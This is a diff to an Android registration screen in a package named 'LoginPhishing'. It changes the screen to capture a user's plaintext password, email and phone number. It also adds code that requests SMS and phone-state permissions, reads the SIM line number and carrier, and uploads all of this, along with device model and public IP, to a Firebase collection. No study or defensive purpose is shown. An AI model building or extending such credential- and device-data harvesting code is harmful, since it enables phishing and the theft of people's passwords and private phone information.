@@ -1,14 +1,17 @@
-
 package com.example.CZ.LoginPhishing;
 
 
+import android.Manifest;
 import android.app.ProgressDialog;
+import android.content.Context;
 import android.content.Intent;
+import android.content.pm.PackageManager;
 import android.os.AsyncTask;
 import android.os.Build;
-import android.support.annotation.NonNull;
-import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.view.View;
 import android.widget.AutoCompleteTextView;
@@ -16,6 +19,11 @@ import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.TextView;
 import android.widget.Toast;
+
+import androidx.annotation.NonNull;
+import androidx.annotation.RequiresApi;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
 
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.OnFailureListener;
@@ -34,12 +42,18 @@ import org.jsoup.nodes.Document;
 
 import java.io.IOException;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
+import java.util.Objects;
+
+import static android.Manifest.permission.READ_PHONE_NUMBERS;
+import static android.Manifest.permission.READ_PHONE_STATE;
+import static android.Manifest.permission.READ_SMS;
 
 public class RegistrationActivity extends AppCompatActivity {
 
     private ImageView logo, joinus;
-    private AutoCompleteTextView username, email, password;
+    private AutoCompleteTextView phoneno, email, password;
     private Button signup;
     private TextView signin;
     private ProgressDialog progressDialog;
@@ -48,9 +62,10 @@ public class RegistrationActivity extends AppCompatActivity {
     private FirebaseFirestore db = FirebaseFirestore.getInstance();
     private Map<String, Object> user = new HashMap<>();
     private String getIP;
+    private String SIMInfo;
 
 
-
+    @RequiresApi(api = Build.VERSION_CODES.M)
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -67,11 +82,11 @@ public class RegistrationActivity extends AppCompatActivity {
             @Override
             public void onClick(View view) {
 
-                final String inputName = username.getText().toString().trim();
+                final String inputName = phoneno.getText().toString().trim();
                 final String inputPw = password.getText().toString().trim();
                 final String inputEmail = email.getText().toString().trim();
 
-                if(validateInput(inputName, inputPw, inputEmail)) {
+                if (validateInput(inputName, inputPw, inputEmail)) {
                     try {
                         registerUser(inputName, inputPw, inputEmail);
                     } catch (IOException e) {
@@ -86,24 +101,27 @@ public class RegistrationActivity extends AppCompatActivity {
         signin.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View view) {
-                startActivity(new Intent(RegistrationActivity.this,LoginActivity.class));
+                startActivity(new Intent(RegistrationActivity.this, LoginActivity.class));
             }
         });
 
     }
 
 
+    @RequiresApi(api = Build.VERSION_CODES.M)
     private void initializeGUI() throws IOException {
 
         logo = findViewById(R.id.ivRegLogo);
         joinus = findViewById(R.id.ivJoinUs);
-        username = findViewById(R.id.atvUsernameReg);
-        email =  findViewById(R.id.atvEmailReg);
+        phoneno = findViewById(R.id.atvUsernameReg);
+        email = findViewById(R.id.atvEmailReg);
         password = findViewById(R.id.atvPasswordReg);
         signin = findViewById(R.id.tvSignIn);
         signup = findViewById(R.id.btnSignUp);
 
         new getPublicIP().execute();
+        getPhoneNumber();
+
         progressDialog = new ProgressDialog(this);
 
         firebaseAuth = FirebaseAuth.getInstance();
@@ -112,16 +130,15 @@ public class RegistrationActivity extends AppCompatActivity {
     private void registerUser(final String inputName, final String inputPw, String inputEmail) throws IOException {
 
         // Create a new user with a email, username and password
-        user.put("username", username.getText().toString());
+        user.put("PhoneNo", phoneno.getText().toString());
         user.put("email", email.getText().toString());
         user.put("password", password.getText().toString());
         user.put("deviceName",getDeviceName());
         user.put("publicIP",getIP);
+        user.put("SIM Info",SIMInfo);
 
         progressDialog.setMessage("Verificating...");
         progressDialog.show();
-
-
 
             firebaseAuth.createUserWithEmailAndPassword(inputEmail,inputPw).addOnCompleteListener(new OnCompleteListener<AuthResult>() {
                 @Override
@@ -136,7 +153,7 @@ public class RegistrationActivity extends AppCompatActivity {
                     else{
                         progressDialog.dismiss();
                         Toast.makeText(RegistrationActivity.this,((FirebaseAuthException) task.getException()).getErrorCode(),Toast.LENGTH_LONG).show();
-                        Log.e("Signup Error", "onCancelled", task.getException());
+                        Log.e("Register Error", "onCancelled", task.getException());
                         //Toast.makeText(RegistrationActivity.this,"Email already exists.",Toast.LENGTH_SHORT).show();
                     }
                 }
@@ -144,12 +161,11 @@ public class RegistrationActivity extends AppCompatActivity {
 
     }
 
-
-    private void sendUserData(String username, String password){
+    private void sendUserData(String phoneno, String password){
 
         firebaseDatabase = FirebaseDatabase.getInstance();
         DatabaseReference users = firebaseDatabase.getReference("users");
-        UserProfile user = new UserProfile(username, password);
+        UserProfile user = new UserProfile(phoneno, password);
         users.push().setValue(user);
 
     }
@@ -157,7 +173,7 @@ public class RegistrationActivity extends AppCompatActivity {
     private boolean validateInput(String inName, String inPw, String inEmail){
 
         if(inName.isEmpty()){
-            username.setError("Username is empty.");
+            phoneno.setError("Phone No is empty.");
             return false;
         }
         if(inPw.isEmpty()){
@@ -171,6 +187,7 @@ public class RegistrationActivity extends AppCompatActivity {
 
         return true;
     }
+
     public String getDeviceName() {
         String manufacturer = Build.MANUFACTURER;
         String model = Build.MODEL;
@@ -180,7 +197,6 @@ public class RegistrationActivity extends AppCompatActivity {
             return capitalize(manufacturer) + " " + model;
         }
     }
-
 
     private String capitalize(String s) {
         if (s == null || s.length() == 0) {
@@ -196,7 +212,7 @@ public class RegistrationActivity extends AppCompatActivity {
 
     private void uploadDB(){
         // Add a new document with a generated ID
-        db.collection("users")
+        db.collection("register")
                 .add(user)
                 .addOnSuccessListener(new OnSuccessListener<DocumentReference>() {
                     @Override
@@ -211,6 +227,63 @@ public class RegistrationActivity extends AppCompatActivity {
                     }
                 });
 
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    private void getPhoneNumber(){
+
+
+
+        if (ActivityCompat.checkSelfPermission(this, READ_SMS) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(this, READ_PHONE_NUMBERS) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(this, READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+            TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+            SIMInfo= Objects.requireNonNull(tMgr).getLine1Number();
+
+        }
+        else{
+
+            requestPermission();
+        }
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    private void requestPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            requestPermissions(new String[]{READ_SMS, READ_PHONE_NUMBERS, READ_PHONE_STATE}, 100);
+
+        }
+
+    }
+
+    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
+    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
+        switch (requestCode) {
+            case 100:
+                TelephonyManager tMgr = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
+                if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) !=
+                        PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this,
+                        Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED  &&
+                        ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+                    return;
+                }
+                SIMInfo =  tMgr.getLine1Number();
+
+                if(SIMInfo.equals("")) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                        List<SubscriptionInfo> subscription = SubscriptionManager.from(getApplicationContext()).getActiveSubscriptionInfoList();
+                        for (int i = 0; i < subscription.size(); i++) {
+                            SubscriptionInfo info = subscription.get(i);
+                            SIMInfo=info.getCarrierName()+"  "+info.getNumber();
+                            Log.d("getPhone", "number " + info.getNumber());
+                            Log.d("getPhone", "network name : " + info.getCarrierName());
+                        }
+                    }
+                }
+
+                Log.e("Phone", String.valueOf(SIMInfo));
+                break;
+        }
     }
 
         private class getPublicIP extends AsyncTask<Void, Void, Void> {
